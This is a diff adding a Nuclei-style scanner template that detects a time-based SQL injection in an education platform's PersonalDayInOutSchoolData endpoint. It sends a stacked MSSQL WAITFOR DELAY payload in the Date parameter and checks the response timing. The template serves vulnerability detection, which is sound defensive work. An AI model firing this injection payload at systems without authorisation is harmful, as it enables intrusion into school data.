@@ -1,0 +1,58 @@
+id: edu-system-personaldayinoutschooldata-sqli
+
+info:
+  name: EDU智慧平台 PersonalDayInOutSchoolData SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects SQL injection vulnerability in the EDU智慧平台's PersonalDayInOutSchoolData endpoint.
+
+variables:
+  t1: "{{rand_int(5, 9)}}"
+  t2: "{{to_number(t1) + 2}}"
+  t3: "{{rand_int(1, 4)}}"
+  t4: "{{to_number(t3) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /ashx/APP/InOutSchoolService.ashx?action=PersonalDayInOutSchoolData&Date=1%27%3BWAITFOR+DELAY+%270%3A0%3A{{t1}}%27--&AccountNo=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"code\":\"200\""
+          - "\"msg\":\"成功\""
+          - "\"total\":\"0\""
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1)"
+          - "duration <= to_number(t2)"
+
+  - raw:
+      - |
+        GET /ashx/APP/InOutSchoolService.ashx?action=PersonalDayInOutSchoolData&Date=1%27%3BWAITFOR+DELAY+%270%3A0%3A{{t3}}%27--&AccountNo=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"code\":\"200\""
+          - "\"msg\":\"成功\""
+          - "\"total\":\"0\""
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t3)"
+          - "duration <= to_number(t4)"
